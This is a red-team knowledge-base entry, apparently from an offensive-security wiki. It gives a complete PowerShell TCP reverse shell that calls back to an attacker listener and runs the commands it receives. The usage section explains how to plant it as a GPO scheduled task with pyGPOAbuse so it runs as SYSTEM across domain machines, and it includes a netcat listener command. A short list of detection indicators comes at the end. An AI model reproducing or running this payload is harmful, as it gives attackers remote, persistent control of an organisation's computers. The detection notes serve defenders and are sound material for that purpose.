---
id: 875535e7-2282-47ad-8b5c-eebffe82a4f2
type: code
name: PowerShell-TCP-Reverse-Shell-for-GPO-Abuse
language: powershell
verified: true
created_at: '2023-04-06T03:56:03.702197+00:00'
updated_at: '2023-04-10T20:26:12.028124+00:00'
platforms:
  - Windows
tags:
  - reverse-shell
  - persistence
  - powershell
validated: true
---

# PowerShell-TCP-Reverse-Shell-for-GPO-Abuse

## Code

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.20.0.2',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Description

A pure PowerShell TCP reverse shell that connects back to an attacker-controlled listener. This code is embedded into a scheduled task via pyGPOAbuse for persistence in Active Directory environments, executing with SYSTEM privileges on domain machines.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $ATTACKER_IP | Attacker's IP address (replace '10.20.0.2') | 10.20.0.2 |
| $ATTACKER_PORT | Port attacker is listening on (replace 1234) | 1234 |

## Usage

Embed this code into the -command parameter of pyGPOAbuse when creating a scheduled task via GPO. Start a listener (e.g., netcat) on the attacker machine: nc -lvnp $ATTACKER_PORT. The shell provides interactive PowerShell access upon task execution.

## Detection

- PowerShell logging (ScriptBlock, Module, Transcription) for suspicious TCPClient and iex invocations
- Network connections from domain machines to attacker IP/port
- Scheduled tasks with anomalous names/descriptions in Task Scheduler
- GPO modifications in SYSVOL showing unauthorized task additions

## Related

- [[procedures/Abuse-Group-Policy-Objects-with-pyGPOAbuse]]
- [[tools/pyGPOAbuse]]
